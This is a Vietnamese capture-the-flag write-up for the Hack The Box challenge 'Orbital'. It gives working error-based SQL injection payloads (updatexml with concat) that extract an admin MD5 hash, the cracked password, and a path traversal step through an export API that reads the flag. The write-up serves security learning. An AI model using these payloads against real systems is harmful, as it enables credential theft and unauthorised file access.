## Hack the box - Orbital

Ta có giao diện như sau

![image](https://user-images.githubusercontent.com/104350480/227454300-ec0ed39b-35a7-40d6-989c-96904b3be2a2.png)

Ném qua burpsuite và truy vấn một câu bất kì thử;

![image](https://user-images.githubusercontent.com/104350480/227455150-dcea7336-f348-40dd-8ba3-a63c6b876c82.png)

Ta được lỗi trả về: 

```
{"error":{"message":["1064","You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'select null,null -- -\"' at line 1"],"type":"ProgrammingError"}}

```

Ở đây nó trả về cho mình biết luôn là đang dùng cơ sở dữ liệu MariaDB, MariaDB là bản phát triển từ mã nguồn Mysql nên ta có thể truy vấn các câu lệnh tương tự như bên Mysql.  Để tiếp tục exploit, mình sẽ dùng một trong những hàm XPATH đuợc sử dụng trong SQL đó là updateXML để trigger ra lỗi và lấy kết quả.

```
UPDATEXML(XMLType_Instance, XPath_string,value_expression, namespace_string)

```

Nếu truy vấn XPath không chính xác ta sẽ nhận được lỗi trả về như sau: 

```
XPATH syntax error: 'xpathqueryhere'
```

Ta sẽ injection với XPATH như sau để dump dữ liệu ra: 
Đầu tiên ta lấy length của password cần:

```
{"username":"admin\" and updatexml(null,concat(0x3a,(select length(password) from users)),null)-- -","password":"123"}

```

![image](https://user-images.githubusercontent.com/104350480/227457723-be81706e-3f77-4027-9988-ae38b7fa3569.png)

password cần lấy ra có độ dài là 32, tiếp tục ta dùng substring để lấy password, ở đây chia ra làm 2 nửa, vì mình thử chỉ được từ 1 đến 31, vẫn phải thử 2 lần: 

```

{"username":"admin\" and updatexml(null,concat(0x3a,(select substring(password,1,16) from users)),null)-- -","password":"123"}


```
> pass1: 1692b753c031f290

```
{"username":"admin\" and updatexml(null,concat(0x3a,(select substring(password,17,32) from users)),null)-- -","password":"123"}

```
> pass2: 5b89e7258dbc49bb

> pass: 1692b753c031f2905b89e7258dbc49bb

Đọc source mình thấy password được lưu ở dạng md5 nên ta đi decrypt thử xem được không: 

![image](https://user-images.githubusercontent.com/104350480/227458488-38227c2b-29e7-4e2e-a7ef-d35fa7265a16.png)

Vậy pass của admin là: ichliebedich

Đăng nhập thành công, mình vào được trang chủ:

![image](https://user-images.githubusercontent.com/104350480/227458727-47a507e6-768b-4f8b-8947-63e979dba82d.png)

Ở đây đọc source code ở phần routes.py ta để ý /api/export có cho phép ta thực hiện get dữ liệu được truyền dưới dạng json qua tham số name  được truyền trong 1 json payload: 

![image](https://user-images.githubusercontent.com/104350480/227515819-f80fbb3f-e7c2-424e-9552-f83ca2278ad2.png)

Để ý là nếu mình truyền đúng, server sẽ send lại cho ta cái file mà ta muốn export, ở đây rõ ràng không có cơ chế bảo vệ path traversal tức hoàn toàn có thể control được nó. Giờ cần tìm file chứa flag nữa là xong. Đọc source trong file docker: 

![image](https://user-images.githubusercontent.com/104350480/227516371-465c9ac3-ff3d-421c-a8dc-ad6550cc89ca.png)

File flag.txt được copy và lưu vào nơi có đường dẫn /signal_sleuth_firmware. Oke vậy giờ mình vào trang thực chủ thực hiện export để bắt đường dẫn nữa là xong: 

![image](https://user-images.githubusercontent.com/104350480/227516730-abd25924-c7cd-4fec-a7d9-62ff0efcbed9.png)

Giờ thực hiện path traversal là có được flag: 

![image](https://user-images.githubusercontent.com/104350480/227515568-02540e51-ed27-461b-a65c-12fc2222c6eb.png)
